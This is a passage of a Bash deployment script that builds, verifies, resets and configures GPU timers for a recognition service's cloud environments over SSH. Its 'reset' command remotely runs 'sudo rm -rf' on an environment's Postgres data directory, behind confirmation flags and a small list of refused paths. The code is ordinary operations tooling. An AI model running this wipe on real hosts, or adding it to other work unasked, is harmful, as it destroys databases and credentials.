    rm -f "${payload}"
    fail "could not build GPU snapshot checker payload"
  fi
  expected_bytes="$(wc -c <"${payload}" | tr -d ' ')"
  expected_sha="$(sha256sum "${payload}" | awk '{print $1}')"
  {
    printf 'ACX_GPU_CHECKER_V1 %s %s\n' "${expected_bytes}" "${expected_sha}"
    cat "${payload}"
  } | timeout --foreground --signal=TERM --kill-after=5s "${gate_timeout}s" \
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ServerAliveInterval=5 \
      -o ServerAliveCountMax=2 -l "${OCI_USER}" -- "${OCI_HOST}" \
    "set -eu
    IFS=' ' read -r protocol expected_bytes expected_sha extra || { echo 'ERROR: missing GPU checker transport header' >&2; exit 90; }
    [ \"\$protocol\" = ACX_GPU_CHECKER_V1 ] && [ -z \"\${extra:-}\" ] || { echo 'ERROR: invalid GPU checker transport header' >&2; exit 90; }
    case \"\$expected_bytes\" in ''|*[!0-9]*) echo 'ERROR: invalid GPU checker byte count' >&2; exit 90 ;; esac
    payload=\$(mktemp)
    checker=\$(mktemp)
    trap 'rm -f \"\$payload\" \"\$checker\"' EXIT
    dd bs=1 count=\"\$expected_bytes\" of=\"\$payload\" status=none
    actual_bytes=\$(wc -c <\"\$payload\" | tr -d ' ')
    [ \"\$actual_bytes\" = \"\$expected_bytes\" ] || { echo \"ERROR: truncated GPU checker payload (\$actual_bytes of \$expected_bytes bytes)\" >&2; exit 91; }
    extra_bytes=\$(dd bs=1 count=1 status=none | wc -c | tr -d ' ')
    [ \"\$extra_bytes\" = 0 ] || { echo 'ERROR: oversized GPU checker payload' >&2; exit 91; }
    actual_sha=\$(sha256sum \"\$payload\" | awk '{print \$1}')
    [ \"\$actual_sha\" = \"\$expected_sha\" ] || { echo 'ERROR: GPU checker payload digest mismatch' >&2; exit 92; }
    IFS= read -r deployments <\"\$payload\" || { echo 'ERROR: GPU checker payload has no deployment registry' >&2; exit 93; }
    sed '1d' \"\$payload\" >\"\$checker\"
    [ -s \"\$checker\" ] || { echo 'ERROR: GPU checker payload has no checker' >&2; exit 93; }
    sudo env ACX_DESCRIBE_LOAD_DIR=/run/acx-write \
      ACX_GPU_COMPOSE_FILE='${remote_dir}/docker-compose.env.yml' \
      ACX_GPU_DEPLOYMENTS=\$deployments \
      ACX_GPU_SNAPSHOT_DIR=/run/acx \
      ACX_GPU_STATE_PATH=/run/acx/gpu-state.json \
      ACX_GPU_UNIT_LOAD_DIR=/run/acx-write \
      ACX_GPU_UNIT_STATE_PATH=/run/acx/gpu-state.json \
      bash \"\$checker\"" || transport_rc=$?
  rm -f "${payload}"
  return "${transport_rc}"
}

emit_verify_ready_diagnostic() {
  local ready_url="$1" ready_response="" ready_body ready_code ready_curl_rc=0
  ready_response="$(curl --silent --show-error --max-time 10 --write-out $'\n%{http_code}' "$ready_url" 2>&1)" || ready_curl_rc=$?
  if [[ "${ready_response}" == *$'\n'* ]]; then
    ready_code="${ready_response##*$'\n'}"
    ready_body="${ready_response%$'\n'*}"
  else
    ready_code="000"
    ready_body="${ready_response}"
  fi
  [[ "${ready_code}" =~ ^[0-9]{3}$ ]] || ready_code="000"
  printf 'GET %s -> HTTP %s (non-gating)\n' "$ready_url" "$ready_code"
  if (( ready_curl_rc != 0 )); then
    if ! printf '%s\n' "${ready_body:-no readiness response}" | sanitize_deploy_diagnostic; then
      echo "diagnostic: readiness body unavailable"
    fi
  else
    if ! printf '%s\n' "$ready_body" | sanitize_deploy_diagnostic; then
      echo "diagnostic: readiness body unavailable"
    fi
  fi
}

do_verify() {
  local env="$1"
  local url ready_url expected_sha actual_sha body attempt max_attempts sleep_s http_code curl_rc health_response
  local actual_variant expected_variant remote_for_variant remote_repo_rc
  url="$(env_to_health_url "$env")"
  ready_url="$(env_to_ready_url "$env")"
  # Use GIT_REF (defaults to HEAD) so verify after `GIT_REF=v0.4.1 deploy ...`
  # checks against the same ref the build/push paths used.
  expected_sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"

  # Bounded retry so post-restart warm-up (typically <30s) does not flap
  # verification, while a genuinely missing/skewed SHA still fails closed.
  max_attempts="${ACX_VERIFY_ATTEMPTS:-5}"
  sleep_s="${ACX_VERIFY_SLEEP:-5}"
  if ! [[ "${max_attempts}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_VERIFY_ATTEMPTS must be a positive integer (got: ${max_attempts})"
  fi
  if ! [[ "${sleep_s}" =~ ^[0-9]+$ ]]; then
    fail "ACX_VERIFY_SLEEP must be a non-negative integer (got: ${sleep_s})"
  fi

  for attempt in $(seq 1 "$max_attempts"); do
    log "GET ${url} (attempt ${attempt}/${max_attempts})"
    health_response=""
    curl_rc=0
    health_response="$(curl --silent --show-error --max-time 10 --write-out $'\n%{http_code}' "$url" 2>&1)" || curl_rc=$?
    http_code="${health_response##*$'\n'}"
    body="${health_response%$'\n'*}"
    if (( curl_rc != 0 )) || [[ "${http_code}" == "000" || -z "${body}" ]]; then
      warn "Health check fetch failed"
      if ! printf '%s\n' "${body:-no health response}" | sanitize_deploy_diagnostic >&2; then
        echo "diagnostic: health body unavailable" >&2
      fi
      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
      continue
    fi
    if ! printf '%s\n' "$body" | sanitize_deploy_diagnostic; then
      echo "diagnostic: health body unavailable"
    fi
    # GR-261: commit_sha is present on unhealthy 503 bodies; identity match
    # must not verify. Gate on 2xx, then SHA. /ready stays non-gating.
    if [[ ! "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
      if [[ "${http_code}" == "503" ]]; then
        warn "UNHEALTHY: ${env} /health reports unhealthy (database) (HTTP 503)"
      else
        warn "UNHEALTHY: ${env} /health HTTP ${http_code}"
      fi
      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
      continue
    fi

    # /health surfaces commit SHA for E15-3a-BR-03 deploy-lag detection.
    actual_sha="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("commit_sha") or d.get("git_commit_sha") or d.get("version") or "")' 2>/dev/null || true)"

    if [[ -z "$actual_sha" || "$actual_sha" == "unknown" ]]; then
      warn "Service did not report a commit SHA (attempt ${attempt}/${max_attempts}). Image may have been built without --build-arg GIT_COMMIT_SHA."
      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
      continue
    fi

    if [[ "${actual_sha:0:8}" == "${expected_sha:0:8}" ]]; then
      # HARM-A-04: commit_sha alone cannot distinguish recognition vs VLM images
      # that share a GIT_REF. Parse image_variant from /health (build-immutable
      # signal) and compare to expected (local resolve, or remote repo name for
      # bare standalone verify).
      actual_variant="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("image_variant") or "")' 2>/dev/null || true)"
      if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" \
         || -n "${ACX_BUILD_TARGET:-}" \
         || -n "${ACX_IMAGE_VARIANT:-}" ]]; then
        expected_variant="$(expected_image_variant)"
      else
        # Bare verify: derive expectation from sticky remote repo when present.
        remote_repo_rc=0
        remote_for_variant="$(read_remote_image_repo "$env")" || remote_repo_rc=$?
        if (( remote_repo_rc != 0 )); then
          warn "VARIANT VERIFY: remote ACX_IMAGE_REPO state is unknown (read exit ${remote_repo_rc})"
          emit_verify_ready_diagnostic "$ready_url"
          return 1
        fi
        if [[ "${remote_for_variant}" == "__INVALID_REPO__" ]]; then
          warn "VARIANT VERIFY: remote ACX_IMAGE_REPO failed charset validation"
          emit_verify_ready_diagnostic "$ready_url"
          return 1
        fi
        if [[ -n "${remote_for_variant}" ]]; then
          expected_variant="$(variant_from_image_repo "${remote_for_variant}")"
        else
          expected_variant="$(expected_image_variant)"
        fi
      fi
      if [[ -n "${actual_variant}" && "${actual_variant}" != "${expected_variant}" ]]; then
        warn "VARIANT MISMATCH: ${env} /health image_variant='${actual_variant}', expected '${expected_variant}' (recognition vs VLM share commit_sha — this is the build-immutable signal)"
        if (( attempt < max_attempts )); then
          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
          continue
        fi
        emit_verify_ready_diagnostic "$ready_url"
        return 1
      fi
      # Also compare the running container image (read from runtime — rg-015)
      # against expected repo. Must return (not fail/exit) so ACX_VERIFY_OPTIONAL works.
      if ! verify_running_image_matches_deployed "$env"; then
        # Image mismatch is not a warm-up flake — still retry once more in case
        # compose is mid-pull, but do not call fail() here.
        if (( attempt < max_attempts )); then
          warn "Image mismatch on attempt ${attempt}/${max_attempts}; retrying with jittered backoff"
          verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
          continue
        fi
        emit_verify_ready_diagnostic "$ready_url"
        return 1
      fi
      if ! verify_live_gpu_snapshots "$env"; then
        warn "GPU snapshot verification failed on ${env}"
        if (( attempt < max_attempts )); then
          sleep "$sleep_s"
          continue
        fi
        emit_verify_ready_diagnostic "$ready_url"
        return 1
      fi
      log "Verified: ${env} runs ${actual_sha:0:8} (matches GIT_REF=${GIT_REF}${actual_variant:+, image_variant=${actual_variant}})"
      return 0
    else
      warn "SKEW: ${env} runs ${actual_sha:0:8}, expected ${expected_sha:0:8} (attempt ${attempt}/${max_attempts}; warm-up retry)"
      verify_retry_sleep "$attempt" "$max_attempts" "$sleep_s"
    fi
  done

  # /ready is diagnostic only: unlike reset, deploy verification keeps its
  # /health + identity/image pass/fail contract. Probe once on the terminal
  # failing attempt so a DB/model failure is visible before rollback.
  emit_verify_ready_diagnostic "$ready_url"
  warn "SKEW: ${env} did not converge to ${expected_sha:0:8} after ${max_attempts} attempts."
  return 1
}

#---------------------------------------------------------------- status
do_status() {
  local env url body sha http_code curl_rc health_response health_status
  for env in dev dev-fir staging prod; do
    url="$(env_to_health_url "$env")"
    health_response=""
    curl_rc=0
    health_response="$(curl -sS --max-time 5 --write-out $'\n%{http_code}' "$url" 2>/dev/null)" || curl_rc=$?
    http_code="${health_response##*$'\n'}"
    body="${health_response%$'\n'*}"
    if (( curl_rc != 0 )) || [[ "${http_code}" == "000" || -z "${body}" ]]; then
      printf '%-8s %s   %s\n' "$env" "unreachable" "$url"
      continue
    fi
    sha="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print((d.get("commit_sha") or d.get("git_commit_sha") or "?")[:8])' 2>/dev/null || echo '?')"
    health_status="$(printf '%s' "$body" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("status") or "")' 2>/dev/null || true)"
    case "${health_status}" in
      ok|unhealthy) ;;
      *) health_status="unreachable" ;;
    esac
    printf '%-8s %s   %-10s %s\n' "$env" "$sha" "$health_status" "$url"
  done
}

#---------------------------------------------------------------- reset
# Destructive remote reset for an OCI environment. This sub-slice (E15-12 slice
# 2a) lands the validation gates and the affirmative dry-run path. The actual
# stop/reset/start sequence + bootstrap + /ready verify is implemented in the
# follow-on slice; that path runs only when ACX_RESET_DRY_RUN!=1.
do_reset() {
  local env="$1"
  local unit remote_dir ready_url

  # env validation: reuse the existing case-based guards. They `fail` on unknown.
  unit="$(env_to_unit "$env")"
  remote_dir="$(env_to_remote_dir "$env")"
  ready_url="$(env_to_ready_url "$env")"

  if [[ "${CONFIRM_REMOTE_RESET:-}" != "RESET" ]]; then
    fail "Remote reset requires CONFIRM_REMOTE_RESET=RESET. Re-run: CONFIRM_REMOTE_RESET=RESET $0 reset $env"
  fi
  if [[ "$env" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
    fail "Production remote reset additionally requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE CONFIRM_REMOTE_RESET=RESET $0 reset prod"
  fi

  log "Reset plan for env=${env}: unit=${unit} remote_dir=${remote_dir} ready_url=${ready_url}"
  log "SSH target: ${SSH_TARGET}"

  # Canonical remote command sequence. ACX_PGDATA_PATH is sourced from the env's
  # .env so the reset boundary stays exactly the env-scoped Postgres data root —
  # no other env's data is touched. `docker compose down` releases the volume
  # mount so the directory can be cleared atomically before restart.
  local remote_cmd
  printf -v remote_cmd '%s\n' \
    "set -euo pipefail" \
    "cd ${remote_dir}" \
    "echo '==> Stopping unit ${unit}'" \
    "sudo systemctl stop ${unit}" \
    "echo '==> Bringing compose project down to release the postgres volume'" \
    "sudo docker compose -f docker-compose.env.yml down --remove-orphans" \
    "echo '==> Sourcing ACX_PGDATA_PATH from ${remote_dir}/.env'" \
    "set -a" \
    "source ${remote_dir}/.env" \
    "set +a" \
    "if [ -z \"\${ACX_PGDATA_PATH:-}\" ]; then echo 'ACX_PGDATA_PATH is empty after sourcing .env — refusing to wipe' >&2; exit 64; fi" \
    "if [ \"\${ACX_PGDATA_PATH}\" = '/' ] || [ \"\${ACX_PGDATA_PATH}\" = '/opt' ] || [ \"\${ACX_PGDATA_PATH}\" = '/opt/acx-backend' ]; then echo \"Refusing to clear suspicious ACX_PGDATA_PATH=\${ACX_PGDATA_PATH}\" >&2; exit 65; fi" \
    "echo \"==> Clearing \${ACX_PGDATA_PATH}\"" \
    "sudo rm -rf -- \"\${ACX_PGDATA_PATH}\"" \
    "sudo mkdir -p -- \"\${ACX_PGDATA_PATH}\"" \
    "echo '==> Starting unit ${unit}'" \
    "sudo systemctl start ${unit}"

  # Post-reset bootstrap. Recreates one usable service-mode API key after the
  # destructive reset wipes the credentials table.
  #
  # Contract notes (E15-12-BR-03):
  #   - manage_api_keys.py requires a top-level --env {prod,dev,local}. The
  #     CLI validates --env against the configured DSN host: 'prod' rejects
  #     loopback hosts, 'dev|local' rejects non-loopback. Inside the api
  #     container on the OCI VM the DSN host is 'postgres' (compose service),
  #     which is non-loopback, so --env prod is the only choice that passes
  #     the validation guard regardless of OCI deployment env (dev/staging/prod).
  #   - The CLI uses `--tenant <uuid>`, NOT `--tenant-id <string>`. Tenant
  #     identifiers must be UUIDs.
  #   - There is no `--name` flag.
  #   - `create` requires the tenant row to already exist (FK constraint), so
  #     we run `tenant create --tenant <uuid> --site-url <url>` first; the
  #     CLI handles the create-or-update case idempotently.
  #   - The OCI postgres is what just got wiped — bootstrap must run on the
  #     remote VM via `docker compose exec api`, not locally.
  # E15-12-BR-06: the plugin sends X-Tenant-ID = TenantIdentity::derive_from_site_url()
  # on every authenticated recognition request, where site_url is the WordPress
  # site URL — not the recognition API URL. The bootstrap MUST bind the new
  # service-mode API key to that same per-site tenant UUID, otherwise the
  # backend rejects the plugin's first authenticated request with HTTP 403
  # 'tenant mismatch' and the operator is left thinking reset failed.
  #
  # Operator contract:
  #   - ACX_RESET_SITE_URL is required and must be the WordPress site URL the
  #     plugin will hit (e.g. http://localhost:10010 for a LocalWP site).
  #     There is no safe default: the previous defaults were the recognition
  #     API URLs, which are NOT what the plugin sends as its origin tenant.
  #   - ACX_RESET_TENANT_ID is optional. When unset, the bootstrap derives the
  #     UUID from ACX_RESET_SITE_URL via scripts/deploy/_derive_tenant_id.py
  #     (the Python mirror of TenantIdentity::derive_from_site_url()). When
  #     set, the explicit value wins — escape hatch for non-derived tenants.
  if [[ -z "${ACX_RESET_SITE_URL:-}" ]]; then
    fail "ACX_RESET_SITE_URL must be set to the WordPress site URL the plugin will hit (e.g. http://localhost:10010 for LocalWP, or https://staging.altcontext.com). The bootstrap derives the per-site tenant UUID from this value to match the plugin's TenantIdentity::derive_from_site_url() (E15-12-BR-06). Set ACX_RESET_TENANT_ID as well only if you need to override derivation for a custom tenant."
  fi
  local site_url="${ACX_RESET_SITE_URL}"
  # D1/S2-A-02: validate BEFORE any ssh/bootstrap interpolation — these reach remote root via sudo.
  assert_safe_reset_site_url "${site_url}"
  local tenant_id
  if [[ -n "${ACX_RESET_TENANT_ID:-}" ]]; then
    tenant_id="${ACX_RESET_TENANT_ID}"
  else
    tenant_id="$(python3 "${SCRIPT_DIR}/_derive_tenant_id.py" "${site_url}")"
  fi
  assert_safe_shell_token "ACX_RESET_TENANT_ID" "${tenant_id}"

  # E15-12-BR-05: each `docker compose exec -T` reads from the remote script's stdin.
  # Without `< /dev/null` on each exec, the first call swallows remaining lines and the
  # second call never runs. Tenant/site values are positional args to `bash -s` (quoted
  # heredoc) — never interpolated into the remote command string (S2-A-02).
  # Audit text for dry-run / operator review. The LIVE path never interpolates these into a
  # remote shell string — it passes them as bash -s positional args (see ssh below).
  local bootstrap_summary
  printf -v bootstrap_summary '%s\n' \
    "bash -s -- ${remote_dir} ${tenant_id} ${site_url}" \
    "  # remote body (quoted heredoc): \$1=remote_dir \$2=tenant_id \$3=site_url" \
    "  cd \"\$1\"" \
    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant ${tenant_id} < /dev/null"

  # /ready verification: distinct from /health because reset specifically needs
  # dependency readiness (postgres up, schema migrated, models loaded) before
  # we declare the env operable. Array form — no shell-eval of the verify command (S2-A-02).
  local -a verify_cmd=(curl -fsS --max-time 30 "${ready_url}")

  if [[ "${ACX_RESET_DRY_RUN:-0}" == "1" ]]; then
    log "DRY-RUN: would invoke ssh ${SSH_TARGET} with the following remote command:"
    printf '%s\n' "${remote_cmd}"
    log "DRY-RUN: would then verify readiness:"
    printf '%s\n' "${verify_cmd[*]}"
    log "DRY-RUN: would then run post-reset bootstrap on ${SSH_TARGET}:"
    printf '%s\n' "${bootstrap_summary}"
    log "DRY-RUN: no SSH session opened; no remote state mutated"
    return 0
  fi

  preflight_ssh
  # Face-pipeline weights must exist before reset restarts the runtime (C-02).
  preflight_remote_face_pipeline_models "$env"
  log "Executing reset on ${SSH_TARGET}"
  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s" <<<"${remote_cmd}"

  log "Verifying readiness at ${ready_url}"
  # Brief settle window: systemd start is async; the unit may need a few seconds
  # before postgres + the API report ready. The bootstrap must wait for /ready
  # because `docker compose exec api` requires the api container to be up.
  local attempts=0
  until "${verify_cmd[@]}"; do
    attempts=$((attempts + 1))
    if (( attempts >= 6 )); then
      fail "Readiness check failed after ${attempts} attempts at ${ready_url}"
    fi
    log "Readiness not yet reported (attempt ${attempts}/6); retrying in 5s"
    sleep 5
  done

  log "Running post-reset bootstrap on ${SSH_TARGET} (tenant create + key create)"
  # Positional args — quoted heredoc body never expands local shell values into the
  # remote command string. tenant_id / site_url reach remote only as argv after --.
  # Unquoted multi-word form: OpenSSH joins destination args into the remote command, so
  # remote argv is: bash -s -- <remote_dir> <tenant_id> <site_url> (charset-validated above).
  ssh -l "${OCI_USER}" -- "${OCI_HOST}" bash -s -- "${remote_dir}" "${tenant_id}" "${site_url}" <<'BOOTSTRAP'
set -euo pipefail
remote_dir="$1"
tenant_id="$2"
site_url="$3"
cd "${remote_dir}"
echo "==> Ensuring tenant row exists for service-mode key bootstrap"
sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant "${tenant_id}" --site-url "${site_url}" < /dev/null
echo "==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)"
sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant "${tenant_id}" < /dev/null
BOOTSTRAP

  log "Reset complete. ${ready_url} returned ready and a fresh service-mode API key was printed above."
}

#------------------------------------------------------- GPU lifecycle timers
# RLSE-11: the deploy pipeline owns this repeatable host convergence step. The
# explicit flag keeps ordinary recognition deploys from changing GPU policy.
do_gpu_lifecycle() {
  local enabled="${ACX_DEPLOY_GPU_LIFECYCLE:-0}"
  local dry_run="${ACX_GPU_LIFECYCLE_DRY_RUN:-0}"
  local -a install_cmd

  case "${enabled}" in
    0)
      printf 'error: GPU lifecycle timer installation disabled; nothing done (set ACX_DEPLOY_GPU_LIFECYCLE=1 to enable)\n' >&2
      return 2
      ;;
    1) ;;
    *) fail "ACX_DEPLOY_GPU_LIFECYCLE must be 0 or 1 (got: ${enabled})" ;;
  esac

  # Release It! 5.5 / rg-008: reject an incomplete enabled configuration
  # before the installer can stage anything on the host.
  [[ -n "${ACX_GPU_READY_URL:-}" ]] || \
    fail "ACX_GPU_READY_URL is required when ACX_DEPLOY_GPU_LIFECYCLE=1"
  if [[ ! "${GPU_INSTANCE_ID:-}" =~ ^ocid1\.instance\.oc1\.[a-z0-9-]+\.[a-z0-9]+$ ]]; then
    printf 'error: ACX_GPU_INSTANCE_ID must match ocid1.instance.oc1.<region>.<identifier>.\n' >&2
    return 2
  fi
  case "${dry_run}" in
    0|1) ;;
    *) fail "ACX_GPU_LIFECYCLE_DRY_RUN must be 0 or 1 (got: ${dry_run})" ;;
  esac

  # OCI_USER / OCI_HOST already passed assert_safe_ssh_identity at load time.
  # Keep them as separate argv values; the installer preserves ssh's
  # `-l USER -- HOST` boundary rather than rebuilding USER@HOST.
  install_cmd=(
    "${SCRIPT_DIR}/gpu-lifecycle-install.sh"
    --user "${OCI_USER}"
    --host "${OCI_HOST}"
    --instance-id "${GPU_INSTANCE_ID}"
    --ready-url "${ACX_GPU_READY_URL}"
  )
  if [[ "${dry_run}" == "1" ]]; then
    install_cmd+=(--dry-run)
    printf 'DRY-RUN:'
    printf ' %q' "${install_cmd[@]}"
    printf '\n'
  else
    log "Installing and verifying GPU lifecycle timers on ${SSH_TARGET}."
  fi
  "${install_cmd[@]}"
}

#---------------------------------------------------------------- dispatch
# Skip dispatch when the script is sourced (e.g. by tests calling individual
# functions), run it only on direct execution.
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  cmd="${1:-}"; shift || true
  case "$cmd" in
    build)        do_build "${1:-dev}" ;;
    build-remote) do_build_remote "${1:-dev}" ;;
    deploy)       [[ -n "${1:-}" ]] || fail "deploy requires <env>"; do_deploy "$@" ;;
    promote)      [[ -n "${1:-}" && -n "${2:-}" ]] || fail "promote requires <from-env> <to-env>"; do_promote "$1" "$2" ;;
    rollback)     [[ -n "${1:-}" && -n "${2:-}" ]] || fail "rollback requires <env> <rollback-id>"; do_rollback "$1" "$2" ;;
    reset)        [[ -n "${1:-}" ]] || fail "reset requires <env> (dev|dev-fir|staging|prod)"; do_reset "$1" ;;
    clear-image-repo) [[ -n "${1:-}" ]] || fail "clear-image-repo requires <env> (dev|dev-fir|staging|prod)"; clear_remote_image_repo_env "$1" ;;
    gpu-lifecycle) do_gpu_lifecycle ;;
    verify)       do_verify "${1:-dev}" ;;
    status)       do_status ;;
    ""|-h|--help|help)
      # Print the whole header comment block (line 2 until the first non-comment
      # line) so ACX_EDGE_APPLY / reset docs stay visible as the header grows.
      awk 'NR==1{next} /^#/{print; next} {exit}' "$0"
      ;;
    *) fail "Unknown command: ${cmd}. Run '$0 help'." ;;
  esac
fi
